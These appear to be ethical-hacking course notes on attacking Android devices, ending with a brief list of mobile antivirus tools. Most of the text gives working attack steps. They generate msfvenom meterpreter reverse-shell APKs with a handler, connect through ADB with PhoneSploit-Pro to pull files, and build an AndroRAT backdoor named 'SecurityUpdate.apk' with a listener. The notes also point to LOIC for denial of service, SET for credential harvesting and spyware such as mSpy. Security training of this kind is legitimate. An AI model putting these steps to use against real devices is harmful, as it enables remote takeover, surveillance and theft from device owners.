# Module 17

## Hacking Mobile Platforms
Mobile devices are prime targets for attackers due to the vast amount of personal and corporate data they hold. This module explores the techniques used to exploit mobile platforms, focusing on Android vulnerabilities, malicious applications, and data theft.

**Objective**:    
To perform hands-on security attacks on an Android device to identify and understand its vulnerabilities. 
Key tasks include:
- Exploit the Vulnerabilities in an Android device
- Obtain Users’ Credentials
- Hack Android device with a Malicious Application
- Use an Android device to launch a DoS attack on a target
- Exploit an Android Device through ADB
- Perform a Security Assessment on an Android device

**Approach**:    
The lab uses a practical approach to simulate real-world attacks. This involves creating and deploying malicious software, exploiting system tools like ADB, and testing the device's security posture to learn how to defend against these threats.

---

### 1. Hack Android Devices
As a professional ethical hacker or pen tester, you should be familiar with all the hacking tools, exploits, and payloads to perform various tests mobile devices connected to a network.

#### 1.1 Hack Android devices with binary payload msfvenom
**Steps**:    
- Create payload
  - `msfvenom –p android/meterpreter/reverse_tcp LHOST=Localhost IP  LPORT=LocalPort -f raw > android_shell.apk`
  - `msfvenom –p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=Localhost IP  LPORT=LocalPort R > android_shell.apk`
- Open multihandler and set the payload as following
  - `use exploit/multi/handler`
  - `set payload android/meterpreter/reverse_tcp`
  - `set LHOST <your-ip-address>`
  - `set LPORT 4444`
  - `exploit`
- After getting the shell
  - `pwd`
  - `cd /sdcard`
  - `ps`

#### 1.2 Harvest credentials using SET
Refer to SET tutorial to capture the credentials

#### 1.3 DOS using LOIC on Android
LOIC apk available. Use that

#### 1.4 Exploit the Android Platform through ADB using PhoneSploit-Pro
Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.

Usually, developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device.
[GitHub - AzeemIdrisi/PhoneSploit-Pro](https://github.com/AzeemIdrisi/PhoneSploit-Pro)
[Hacking Android Using PhoneSploit](https://n00bie.medium.com/hacking-android-using-phonesploit-ffbb2a899e6)

**Installation**    
- `git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro.git`
- `cd PhoneSploit-Pro/`
- `pip install -r requirements.txt`
- `python3 phonesploitpro.py`
> If adb not found error
- `sudo apt update`
- `sudo apt install android-tools-adb android-tools-fastboot`

To launch the tool, Use the following command: `python3 phonesploitpro.py`
- The PhoneSploit Pro main menu options appear, as shown in the screenshot.
- Type 1 and press Enter to select 1. Connect a Device option.When prompted to Enter a phones ip address, type the target Android device’s IP address (in this case, 10.10.1.14) and press Enter. If you are getting Connection timed out error, then type 1 again and press Enter. If you do not get any option, then type 1 and press Enter again, until you get Enter a phones ip address opti
- You will see that the target Android device (in this case, 10.10.1.14) is connected through port number 5555.
- Now, you can try different exploits

**Doing the same stuff with adb**    
`apt-get update`
`sudo apt-get install adb -y`
`adb devices -l`

> Connection Establish Steps
- `adb connect 192.168.0.4:5555`
- `adb devices -l`
- `adb shell`

> Download a File from Android using ADB tool
- `adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt`
- `adb pull sdcard/log.txt /home/mmurphy/Desktop`

#### 1.5 Hack android devices with AndroRAT
AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it. AndroRAT is a client/server application developed in Java Android for the client side and the Server is in Python. AndroRAT provides a fully persistent backdoor to the target device as the app starts automatically on device boot up, it also obtains the current location, sim card details, IP address and MAC address of the device.
[GitHub - karma9874/AndroRAT](https://github.com/karma9874/AndroRAT)

- You can move into the AndroRAT folder and then use the following command to create an APK file.
- `python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk`
  - `--build`: is used for building the APK
  - `-i`: specifies the local IP address (here, 10.10.1.13)
  - `-p`: specifies the port number (here, 4444)
  - `-o`: specifies the output APK file (here, SecurityUpdate.apk)
- An APK file (SecurityUpdate.apk) is generated at the location /home/attacker/AndroRAT/
- Now, move the apk file to the target and use the following command to open a listener.
- `python3 androRAT.py --shell -i 0.0.0.0 -p 4444`
  - `--shell`: is used for getting the interpreter
  - `-i`: specifies the IP address for listening (here, 0.0.0.0)
  - `-p`: specifies the port number (here, 4444)
- Install the malicious application on your target and you will get the shell.
- In the Interpreter session, type help and press Enter to view the available commands.
You can also use other Android hacking tools such as hxp_photo_eye (https://github.com), Gallery Eye (https://github.com), mSpy (https://www.mspy.com), and Hackingtoolkit (https://github.com) to hack Android devices.

---

### 2. Secure Android Device 
Like personal computers, mobile devices store sensitive data and are susceptible to various threats. Therefore, they should be properly secured.

#### 2.1 Secure Android Devices from Malicious Apps using AVG
AVG AntiVirus is mobile security tool that provides protection against harmful viruses and malware. It also provides protection to your personal data afe with App Lock, Photo Vault, Wi-Fi Security Scan, Hack Alerts, Malware security, and App Permissions advisor.
[AVG AntiVirus & Security - Apps on Google Play](https://play.google.com/store/apps/details?id=com.antivirus&hl=en)

#### 2.2 Analyze malicious apps using online Android Analyzers
[Sixo Online APK Analyzer | sisik](https://sisik.eu/apk-tool)

#### 2.3 Secure Android devices with Malware Bytes
[Malwarebytes Mobile Security - Apps on Google Play](https://play.google.com/store/apps/details?id=org.malwarebytes.antimalware&hl=en&pli=1)

You can use other mobile antivirus and anti-spyware tools such as Certo: Anti Spyware & Security (https://play.google.com), Anti Spy Detector - Spyware (https://play.google.com), iAmNotified - Anti Spy System (https://iamnotified.com), Anti Spy (https://www.protectstar.com), and Secury - Anti Spy Security (https://apps.apple.com) to secure mobile devices from malicious apps.


---
---
